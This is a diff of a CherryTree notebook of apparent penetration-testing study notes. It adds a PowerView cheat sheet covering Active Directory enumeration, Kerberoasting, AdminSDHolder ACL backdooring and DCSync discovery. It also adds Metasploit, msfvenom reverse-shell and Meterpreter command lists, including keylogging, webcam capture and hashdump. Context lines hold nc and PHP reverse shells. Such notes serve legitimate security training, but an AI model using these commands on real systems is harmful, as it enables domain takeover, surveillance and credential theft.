@@ -310,7 +310,7 @@ regedit
 windows firewall
 WF.msc</rich_text>
 			</node>
-			<node custom_icon_id="0" foreground="" is_bold="False" name="powershell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655649452.75" ts_lastsave="1655649799.32" unique_id="39">
+			<node custom_icon_id="0" foreground="" is_bold="False" name="powershell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655649452.75" ts_lastsave="1655725264.25" unique_id="39">
 				<rich_text>bypass execution policy
 </rich_text>
 				<rich_text family="monospace">powershell -ep bypass</rich_text>
@@ -320,8 +320,231 @@ importing (?) powerview script
 </rich_text>
 				<rich_text family="monospace">. .\PowerView.ps1</rich_text>
 			</node>
-			<node custom_icon_id="0" foreground="" is_bold="False" name="powerview" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655649812.22" ts_lastsave="1655649813.09" unique_id="40">
+			<node custom_icon_id="0" foreground="" is_bold="False" name="powerview" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655649812.22" ts_lastsave="1655727658.53" unique_id="40">
 				<rich_text link="webs https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993</rich_text>
+				<rich_text>
+
+get fulldata and selecting OS
+Get-NetComputer -fulldata | select operatingsystem
+
+get users and selecting domain name
+</rich_text>
+				<rich_text family="monospace">Get-NetUser | select cn</rich_text>
+				<rich_text>
+
+show all group
+Get-NetGroup
+
+# PowerView's last major overhaul is detailed here: http://www.harmj0y.net/blog/powershell/make-powerview-great-again/
+#   tricks for the 'old' PowerView are at https://gist.github.com/HarmJ0y/3328d954607d71362e3c
+
+# the most up-to-date version of PowerView will always be in the dev branch of PowerSploit:
+#   https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
+
+# New function naming schema:
+#   Verbs:
+#       Get : retrieve full raw data sets
+#       Find : ‘find’ specific data entries in a data set
+#       Add : add a new object to a destination
+#       Set : modify a given object
+#       Invoke : lazy catch-all
+#   Nouns:
+#       Verb-Domain* : indicates that LDAP/.NET querying methods are being executed
+#       Verb-WMI* : indicates that WMI is being used under the hood to execute enumeration
+#       Verb-Net* : indicates that Win32 API access is being used under the hood
+
+
+# get all the groups a user is effectively a member of, 'recursing up' using tokenGroups
+Get-DomainGroup -MemberIdentity &lt;User/Group&gt;
+
+# get all the effective members of a group, 'recursing down'
+Get-DomainGroupMember -Identity &quot;Domain Admins&quot; -Recurse
+
+# use an alterate creadential for any function
+$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+Get-DomainUser -Credential $Cred
+
+# retrieve all the computer dns host names a GPP password applies to
+Get-DomainOU -GPLink '&lt;GPP_GUID&gt;' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}
+
+# get all users with passwords changed &gt; 1 year ago, returning sam account names and password last set times
+$Date = (Get-Date).AddYears(-1).ToFileTime()
+Get-DomainUser -LDAPFilter &quot;(pwdlastset&lt;=$Date)&quot; -Properties samaccountname,pwdlastset
+
+# all enabled users, returning distinguishednames
+Get-DomainUser -LDAPFilter &quot;(!userAccountControl:1.2.840.113556.1.4.803:=2)&quot; -Properties distinguishedname
+Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname
+
+# all disabled users
+Get-DomainUser -LDAPFilter &quot;(userAccountControl:1.2.840.113556.1.4.803:=2)&quot;
+Get-DomainUser -UACFilter ACCOUNTDISABLE
+
+# all users that require smart card authentication
+Get-DomainUser -LDAPFilter &quot;(useraccountcontrol:1.2.840.113556.1.4.803:=262144)&quot;
+Get-DomainUser -UACFilter SMARTCARD_REQUIRED
+
+# all users that *don't* require smart card authentication, only returning sam account names
+Get-DomainUser -LDAPFilter &quot;(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)&quot; -Properties samaccountname
+Get-DomainUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname
+
+# use multiple identity types for any *-Domain* function
+'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff
+
+# find all users with an SPN set (likely service accounts)
+Get-DomainUser -SPN
+
+# check for users who don't have kerberos preauthentication set
+Get-DomainUser -PreauthNotRequired
+Get-DomainUser -UACFilter DONT_REQ_PREAUTH
+
+# find all service accounts in &quot;Domain Admins&quot;
+Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}
+
+# find users with sidHistory set
+Get-DomainUser -LDAPFilter '(sidHistory=*)'
+
+# find any users/computers with constrained delegation st
+Get-DomainUser -TrustedToAuth
+Get-DomainComputer -TrustedToAuth
+
+# enumerate all servers that allow unconstrained delegation, and all privileged users that aren't marked as sensitive/not for delegation
+$Computers = Get-DomainComputer -Unconstrained
+$Users = Get-DomainUser -AllowDelegation -AdminCount
+
+# return the local *groups* of a remote server
+    
+
+# return the local group *members* of a remote server using Win32 API methods (faster but less info)
+Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local
+
+# Kerberoast any users in a particular OU with SPNs set
+Invoke-Kerberoast -SearchBase &quot;LDAP://OU=secret,DC=testlab,DC=local&quot;
+
+# Find-DomainUserLocation == old Invoke-UserHunter
+# enumerate servers that allow unconstrained Kerberos delegation and show all users logged in
+Find-DomainUserLocation -ComputerUnconstrained -ShowAll
+
+# hunt for admin users that allow delegation, logged into servers that allow unconstrained delegation
+Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation
+
+# find all computers in a given OU
+Get-DomainComputer -SearchBase &quot;ldap://OU=...&quot;
+
+# Get the logged on users for all machines in any *server* OU in a particular domain
+Get-DomainOU -Identity *server* -Domain &lt;domain&gt; | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_}}
+
+# enumerate all gobal catalogs in the forest
+Get-ForestGlobalCatalog
+
+# turn a list of computer short names to FQDNs, using a global catalog
+gc computers.txt | % {Get-DomainComputer -SearchBase &quot;GC://GLOBAL.CATALOG&quot; -LDAP &quot;(name=$_)&quot; -Properties dnshostname}
+
+# enumerate the current domain controller policy
+$DCPolicy = Get-DomainPolicy -Policy DC
+$DCPolicy.PrivilegeRights # user privilege rights on the dc...
+
+# enumerate the current domain policy
+$DomainPolicy = Get-DomainPolicy -Policy Domain
+$DomainPolicy.KerberosPolicy # useful for golden tickets ;)
+$DomainPolicy.SystemAccess # password age/etc.
+
+# enumerate what machines that a particular user/group identity has local admin rights to
+#   Get-DomainGPOUserLocalGroupMapping == old Find-GPOLocation
+Get-DomainGPOUserLocalGroupMapping -Identity &lt;User/Group&gt;
+
+# enumerate what machines that a given user in the specified domain has RDP access rights to
+Get-DomainGPOUserLocalGroupMapping -Identity &lt;USER&gt; -Domain &lt;DOMAIN&gt; -LocalGroup RDP
+
+# export a csv of all GPO mappings
+Get-DomainGPOUserLocalGroupMapping | %{$_.computers = $_.computers -join &quot;, &quot;; $_} | Export-CSV -NoTypeInformation gpo_map.csv
+
+# use alternate credentials for searching for files on the domain
+#   Find-InterestingDomainShareFile == old Invoke-FileFinder
+$Password = &quot;PASSWORD&quot; | ConvertTo-SecureString -AsPlainText -Force
+$Credential = New-Object System.Management.Automation.PSCredential(&quot;DOMAIN\user&quot;,$Password)
+Find-InterestingDomainShareFile -Domain DOMAIN -Credential $Credential
+
+# enumerate who has rights to the 'matt' user in 'testlab.local', resolving rights GUIDs to names
+Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local
+
+# grant user 'will' the rights to change 'matt's password
+Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose
+
+# audit the permissions of AdminSDHolder, resolving GUIDs
+Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs
+
+# backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
+
+# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
+Get-DomainObjectAcl &quot;dc=dev,dc=testlab,dc=local&quot; -ResolveGUIDs | ? {
+    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
+}
+
+# find linked DA accounts using name correlation
+Get-DomainGroupMember 'Domain Admins' | %{Get-DomainUser $_.membername -LDAPFilter '(displayname=*)'} | %{$a=$_.displayname.split(' ')[0..1] -join ' '; Get-DomainUser -LDAPFilter &quot;(displayname=*$a*)&quot; -Properties displayname,samaccountname}
+
+# save a PowerView object to disk for later usage
+Get-DomainUser | Export-Clixml user.xml
+$Users = Import-Clixml user.xml
+
+# Find any machine accounts in privileged groups
+Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'}
+
+# Enumerate permissions for GPOs where users with RIDs of &gt; -1000 have some kind of modification/control rights
+Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
+
+# find all policies applied to a current machine
+Get-DomainGPO -ComputerIdentity windows1.testlab.local
+
+# enumerate all groups in a domain that don't have a global scope, returning just group names
+Get-DomainGroup -GroupScope NotGlobal -Properties name
+
+# enumerate all foreign users in the global catalog, and query the specified domain localgroups for their memberships
+#   query the global catalog for foreign security principals with domain-based SIDs, and extract out all distinguishednames
+$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase &quot;GC://testlab.local&quot; -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\d{2,}$'} | Select-Object -ExpandProperty distinguishedname
+$Domains = @{}
+$ForeignMemberships = ForEach($ForeignUser in $ForeignUsers) {
+    # extract the domain the foreign user was added to
+    $ForeignUserDomain = $ForeignUser.SubString($ForeignUser.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+    # check if we've already enumerated this domain
+    if (-not $Domains[$ForeignUserDomain]) {
+        $Domains[$ForeignUserDomain] = $True
+        # enumerate all domain local groups from the given domain that have membership set with our foreignSecurityPrincipal set
+        $Filter = &quot;(|(member=&quot; + $($ForeignUsers -join &quot;)(member=&quot;) + &quot;))&quot;
+        Get-DomainGroup -Domain $ForeignUserDomain -Scope DomainLocal -LDAPFilter $Filter -Properties distinguishedname,member
+    }
+}
+$ForeignMemberships | fl
+
+# if running in -sta mode, impersonate another credential a la &quot;runas /netonly&quot;
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+Invoke-UserImpersonation -Credential $Cred
+# ... action
+Invoke-RevertToSelf
+
+# enumerates computers in the current domain with 'outlier' properties, i.e. properties not set from the firest result returned by Get-DomainComputer
+Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier
+
+# set the specified property for the given user identity
+Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
+
+# Set the owner of 'dfm' in the current domain to 'harmj0y'
+Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y
+
+# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
+Get-ObjectACL &quot;DC=testlab,DC=local&quot; -ResolveGUIDs | ? {
+    ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')
+}
+
+# check if any user passwords are set
+$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' &quot;$([System.Text.Encoding]::ASCII.GetString($_.userPassword))&quot; -PassThru} | fl
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="metasploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655727658.53" ts_lastsave="1655727658.53" unique_id="41">
+				<rich_text></rich_text>
 			</node>
 		</node>
 	</node>
@@ -458,7 +681,7 @@ nslookup --type=TXT website.thm</rich_text>
 nc 172.16.1.100 1234 -e /bin/sh
 php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</rich_text>
 	</node>
-	<node custom_icon_id="0" foreground="" is_bold="False" name="tests" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394210.03" ts_lastsave="1655395012.38" unique_id="19">
+	<node custom_icon_id="0" foreground="" is_bold="False" name="tests" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394210.03" ts_lastsave="1655727693.85" unique_id="19">
 		<rich_text></rich_text>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="note.dtd" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655395012.38" ts_lastsave="1655395016.26" unique_id="33">
 			<rich_text></rich_text>
@@ -523,6 +746,241 @@ php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&am
  &lt;/</rich_text>
 			<rich_text foreground="#569cd6">note</rich_text>
 			<rich_text foreground="#808080">&gt;</rich_text>
+		</node>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="metasploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655727693.85" ts_lastsave="1655729074.42" unique_id="42">
+		<rich_text>start postgresql for msfdb
+</rich_text>
+		<rich_text family="monospace">systemctl start postgresql</rich_text>
+		<rich_text>
+
+adding workspace
+workspace -a &lt;workspace_name&gt;
+
+more info on workspace
+workspace -h
+
+run metasploit
+sudo msfconsole -q
+
+run msfdb
+sudo msfdb init
+
+for help
+help
+
+search for module
+search &lt;search_query&gt;
+
+get summary of module
+info &lt;module_name&gt;
+info &lt;search_id&gt;
+
+using module
+use &lt;module_name&gt;
+use &lt;search_id&gt;
+
+showing module options
+options
+
+setting options
+set &lt;options&gt; &lt;value&gt;
+
+showing payloads/aux/options of a module
+show &lt;what to show&gt;
+
+search by type
+search type:auxiliary telnet
+
+set global value
+setg &lt;option&gt; &lt;value&gt;
+
+unset global value
+unsetg &lt;option&gt;s
+
+running exploit
+exploit
+exploit -z (background)
+
+background an exploit
+CTRL+Z
+
+interacting with different session
+sessions -i &lt;session_id&gt;</rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="msfvenom" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655729074.42" ts_lastsave="1655729220.06" unique_id="43">
+			<rich_text>show payloads
+msfvenom -l payloads
+
+msfvenom common flag
+-f format
+-e encoding
+
+example
+</rich_text>
+			<rich_text family="monospace">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf &gt; rev_shell.elf</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="meterpreter" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655729174.31" ts_lastsave="1655729544.87" unique_id="44">
+			<rich_text>get meterpreter pid
+</rich_text>
+			<rich_text family="monospace">getpid</rich_text>
+			<rich_text>
+
+running process
+ps
+
+Core commands
+    •         </rich_text>
+			<rich_text family="monospace">background</rich_text>
+			<rich_text>: Backgrounds the             current session
+    •         </rich_text>
+			<rich_text family="monospace">exit</rich_text>
+			<rich_text>:             Terminate the Meterpreter session
+    •         </rich_text>
+			<rich_text family="monospace">guid</rich_text>
+			<rich_text>:             Get the session GUID (Globally Unique Identifier)
+
+    •         </rich_text>
+			<rich_text family="monospace">help</rich_text>
+			<rich_text>:             Displays the help menu
+    •         </rich_text>
+			<rich_text family="monospace">info</rich_text>
+			<rich_text>:             Displays information about a Post module
+    •         </rich_text>
+			<rich_text family="monospace">irb</rich_text>
+			<rich_text>:             Opens an interactive Ruby shell on the current session
+    •         </rich_text>
+			<rich_text family="monospace">load</rich_text>
+			<rich_text>:             Loads one or more Meterpreter extensions
+    •         </rich_text>
+			<rich_text family="monospace">migrate</rich_text>
+			<rich_text>: Allows you to             migrate Meterpreter to another process
+    •         </rich_text>
+			<rich_text family="monospace">run</rich_text>
+			<rich_text>:             Executes a Meterpreter script or Post module
+    •         </rich_text>
+			<rich_text family="monospace">sessions</rich_text>
+			<rich_text>: Quickly switch to             another session
+File system         commands
+    •         </rich_text>
+			<rich_text family="monospace">cd</rich_text>
+			<rich_text>:             Will change directory
+    •         </rich_text>
+			<rich_text family="monospace">ls</rich_text>
+			<rich_text>:             Will list files in the current directory (dir will also work)
+    •         </rich_text>
+			<rich_text family="monospace">pwd</rich_text>
+			<rich_text>:             Prints the current working directory
+    •         </rich_text>
+			<rich_text family="monospace">edit</rich_text>
+			<rich_text>:             will allow you to edit a file
+    •         </rich_text>
+			<rich_text family="monospace">cat</rich_text>
+			<rich_text>:             Will show the contents of a file to the screen
+    •         </rich_text>
+			<rich_text family="monospace">rm</rich_text>
+			<rich_text>:             Will delete the specified file
+    •         </rich_text>
+			<rich_text family="monospace">search</rich_text>
+			<rich_text>:             Will search for files
+    •         </rich_text>
+			<rich_text family="monospace">upload</rich_text>
+			<rich_text>:             Will upload a file or directory
+    •         </rich_text>
+			<rich_text family="monospace">download</rich_text>
+			<rich_text>: Will download a file             or directory
+Networking commands 
+    •         </rich_text>
+			<rich_text family="monospace">arp</rich_text>
+			<rich_text>:             Displays the host ARP (Address Resolution Protocol) cache
+    •         </rich_text>
+			<rich_text family="monospace">ifconfig</rich_text>
+			<rich_text>: Displays network             interfaces available on the target system
+
+    •         </rich_text>
+			<rich_text family="monospace">netstat</rich_text>
+			<rich_text>: Displays the network             connections
+    •         </rich_text>
+			<rich_text family="monospace">portfwd</rich_text>
+			<rich_text>: Forwards a local             port to a remote service
+    •         </rich_text>
+			<rich_text family="monospace">route</rich_text>
+			<rich_text>:             Allows you to view and modify the routing table
+System commands
+    •         </rich_text>
+			<rich_text family="monospace">clearev</rich_text>
+			<rich_text>: Clears the event             logs
+    •         </rich_text>
+			<rich_text family="monospace">execute</rich_text>
+			<rich_text>: Executes a             command
+    •         </rich_text>
+			<rich_text family="monospace">getpid</rich_text>
+			<rich_text>:             Shows the current process identifier
+    •         </rich_text>
+			<rich_text family="monospace">getuid</rich_text>
+			<rich_text>:             Shows the user that Meterpreter is running as
+    •         </rich_text>
+			<rich_text family="monospace">kill</rich_text>
+			<rich_text>:             Terminates a process
+    •         </rich_text>
+			<rich_text family="monospace">pkill</rich_text>
+			<rich_text>:             Terminates processes by name
+    •         </rich_text>
+			<rich_text family="monospace">ps</rich_text>
+			<rich_text>:             Lists running processes
+    •         </rich_text>
+			<rich_text family="monospace">reboot</rich_text>
+			<rich_text>:             Reboots the remote computer
+    •         </rich_text>
+			<rich_text family="monospace">shell</rich_text>
+			<rich_text>:             Drops into a system command shell
+    •         </rich_text>
+			<rich_text family="monospace">shutdown</rich_text>
+			<rich_text>: Shuts down the             remote computer
+    •         </rich_text>
+			<rich_text family="monospace">sysinfo</rich_text>
+			<rich_text>: Gets information             about the remote system, such as OS
+Others Commands (these         will be listed under different menu categories in the help menu)
+    •         </rich_text>
+			<rich_text family="monospace">idletime</rich_text>
+			<rich_text>: Returns the number             of seconds the remote user has been idle
+    •         </rich_text>
+			<rich_text family="monospace">keyscan_dump</rich_text>
+			<rich_text>: Dumps the keystroke             buffer
+    •         </rich_text>
+			<rich_text family="monospace">keyscan_start</rich_text>
+			<rich_text>: Starts capturing             keystrokes
+    •         </rich_text>
+			<rich_text family="monospace">keyscan_stop</rich_text>
+			<rich_text>: Stops capturing             keystrokes
+    •         </rich_text>
+			<rich_text family="monospace">screenshare</rich_text>
+			<rich_text>: Allows you to watch             the remote user's desktop in real time
+    •         </rich_text>
+			<rich_text family="monospace">screenshot</rich_text>
+			<rich_text>: Grabs a screenshot             of the interactive desktop
+    •         </rich_text>
+			<rich_text family="monospace">record_mic</rich_text>
+			<rich_text>: Records audio from             the default microphone for X seconds
+    •         </rich_text>
+			<rich_text family="monospace">webcam_chat</rich_text>
+			<rich_text>: Starts a video             chat
+    •         </rich_text>
+			<rich_text family="monospace">webcam_list</rich_text>
+			<rich_text>: Lists webcams    
+    •         </rich_text>
+			<rich_text family="monospace">webcam_snap</rich_text>
+			<rich_text>: Takes a snapshot             from the specified webcam
+    •         </rich_text>
+			<rich_text family="monospace">webcam_stream</rich_text>
+			<rich_text>: Plays a video stream             from the specified webcam
+    •         </rich_text>
+			<rich_text family="monospace">getsystem</rich_text>
+			<rich_text>: Attempts to elevate             your privilege to that of local system
+    •         </rich_text>
+			<rich_text family="monospace">hashdump</rich_text>
+			<rich_text>: Dumps the contents             of the SAM database
+
+</rich_text>
 		</node>
 	</node>
 	<node custom_icon_id="0" foreground="" is_bold="False" name="lab_ideas" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394224.89" ts_lastsave="1655397167.66" unique_id="20">
